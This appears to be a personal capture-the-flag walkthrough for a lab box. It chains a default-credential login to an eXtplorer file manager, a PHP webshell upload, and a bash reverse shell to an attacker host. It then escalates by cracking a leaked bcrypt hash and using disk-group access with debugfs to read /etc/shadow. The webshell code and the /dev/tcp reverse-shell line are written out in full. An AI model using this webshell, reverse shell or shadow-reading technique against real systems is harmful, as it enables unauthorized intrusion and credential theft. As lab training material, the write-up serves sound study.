## Summary

Foothold is a default-credentials login into an eXtplorer file manager (found alongside a WordPress install), followed by a straightforward PHP webshell upload for RCE. Privesc chains through a config file leaking a bcrypt hash, cracked to get a real user account — which turns out to belong to the `disk` group. That group membership allows raw block-device access, letting us read `/etc/shadow` directly off the disk via `debugfs` even without normal file permissions, bypassing OS-level file protections entirely. Cracking the root hash from there finishes the box.

**Chain:** default creds on file manager → PHP webshell upload → RCE as www-data → config file credential leak → crack bcrypt hash → `disk` group membership → raw disk read via `debugfs` → crack root's shadow hash → root

---

## Enumeration

### Nmap

```bash
nmap -T4 $IP -Pn
```

Only two ports open:

- `22/tcp` — SSH
- `80/tcp` — HTTP, serving a WordPress installation

### Content discovery

WordPress itself wasn't the way in — running gobuster against the web root surfaced a separate, unlinked application:

```bash
gobuster dir -u http://$IP/ -w <wordlist>
```

This turned up `/filemanager`, an **eXtplorer** login page — a standalone PHP file-manager app running alongside WordPress, not part of it.

**Pattern to remember:** a CMS like WordPress on port 80 doesn't mean the CMS itself is the attack surface. Directory brute-forcing routinely finds separate admin tools, file managers, or leftover apps sitting quietly next to the "real" site. Always enumerate broadly even when there's an obvious CMS front door.

### Default credentials

`admin:admin` authenticated successfully against the eXtplorer login.

**Pattern to remember:** file managers, admin panels, and CMS plugins are prime candidates for default creds — try them before anything else, every time.

---

## Exploitation

### Webshell upload

eXtplorer's dashboard allows uploading and editing files directly. Since it's a file manager for a PHP-driven site, uploading a `.php` file gives immediate code execution.

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

Uploading this as `shell.php` and requesting it with `?cmd=id` confirmed command execution as `www-data`.

**Pattern to remember:** any file manager or upload feature that lets you drop a `.php` file into a web-served directory is an instant RCE path — no CVE needed, it's the intended functionality being (mis)used.

### Upgrading to a reverse shell

From the webshell, pulled down and executed a standard bash reverse shell one-liner:

```bash
# attacker: start listener
nc -lvnp 4444

# attacker: serve payload
python3 -m http.server 80

# via webshell ?cmd= parameter, target fetches and runs:
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```

Landed an interactive shell as `www-data`.

---

## Privilege Escalation

### Config file credential leak

Standard post-shell enumeration of the web root turned up a config file for the file manager app itself:

```
/var/www/html/filemanager/config/.htusers.php
```

```php
$GLOBALS["users"]=array(
    array('admin','21232f297a57a5a743894a0e4a801fc3', ...),
    array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS', ...),
);
```

Two hashes: an MD5 for `admin` (that's just `21232f297a57a5a743894a0e4a801fc3` = "admin" — a hash of the default password, not useful beyond confirming the obvious), and a **bcrypt** hash for a real system-looking user, `dora`.

**Pattern to remember:** app-specific config/credential files (`.htusers.php`, `wp-config.php`, `.env`, database connection files, etc.) are one of the highest-value things to grep for after landing any web shell. They frequently contain credentials that map to real OS-level accounts, not just app-level ones.

### Cracking the bcrypt hash

```bash
john hash --wordlist=rockyou.txt
```

Cracked to `doraemon`. This matches the OS user `dora` (username `dora`, hostname `dora`, password themed after "Doraemon" — a fun reminder that hostnames/usernames on these boxes often hint at the box's password theme).

```bash
su dora
# password: doraemon
```

### Discovering the `disk` group privilege

```bash
id
# uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```

`dora` is a member of the `disk` group. This group grants raw read access to block devices under `/dev` — effectively bypassing normal filesystem permissions, because you're reading the disk directly rather than going through the filesystem's access controls.

**Pattern to remember:** `disk` group membership is a serious privilege escalation vector, not a cosmetic one. Members can read (and on many systems write) raw block devices, which means arbitrary file read/write across the entire filesystem — including files like `/etc/shadow` that would normally be root-only. Always check group memberships after landing any shell, not just sudo rights; groups like `disk`, `adm`, `lxd`, and `docker` are all known privesc paths in their own right (worth a dedicated note per group).

### Reading `/etc/shadow` via raw disk access

Identify the relevant block device:

```bash
df -h
# /dev/mapper/ubuntu--vg-ubuntu--lv   9.8G  /
```

Use `debugfs` — a filesystem debugger that can read ext-family filesystems directly from the block device — to read protected files without going through normal permission checks:

```bash
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs:  cat /etc/shadow
debugfs:  cat /etc/passwd
```

This dumps the full contents of both files, including root's shadow hash, despite `dora` having no normal read permission on `/etc/shadow`.

**Pattern to remember:** `debugfs` (and similar low-level filesystem tools) read blocks directly off the device, ignoring the filesystem's own permission layer entirely. Any account that can read the raw block device — `disk` group membership, or direct access to `/dev/sd*`/`/dev/mapper/*` — can use this to exfiltrate any file on the system, permissions be damned.

### Cracking root's password

Copy `passwd` and `shadow` contents back to the attack machine, combine them, and crack:

```bash
unshadow passwd shadow > unshadowed.txt
john unshadowed.txt --wordlist=rockyou.txt
```

Cracked root's hash to `explorer` (thematically tying back to "eXtplorer" — another reminder that box/app names often hint at password themes).

```bash
su
# password: explorer
```

Root obtained.

---

## Lessons / Transferable Techniques

1. **Enumerate broadly even with an obvious CMS present.** Secondary apps (file managers, admin tools) sitting alongside a CMS are common and often weaker than the CMS itself.
2. **Try default creds on every login form found**, not just the main site's.
3. **File manager upload features are a direct RCE path** — no vulnerability research needed if you can drop a `.php` file into a web-served directory.
4. **Grep for app config files after any foothold.** They routinely leak credentials that work for real OS accounts, not just the app.
5. **Check group memberships, not just `sudo -l`.** Groups like `disk`, `adm`, `lxd`, `docker`, and `shadow` each carry their own privesc technique independent of sudo.
6. **`disk` group → raw block device read → `debugfs` → bypass all filesystem permissions.** This is a clean, repeatable technique whenever `disk` shows up in `id`.
7. **Usernames, hostnames, and app names are often thematic password hints** on CTF-style boxes — worth trying as wordlist candidates alongside rockyou.

## Related

- [[Default Credentials Checklist]]
- [[Webshell Upload Techniques]]
- [[Linux Privileged Group Abuse]]
- [[debugfs Raw Disk Read]]
- [[Hash Cracking with John]]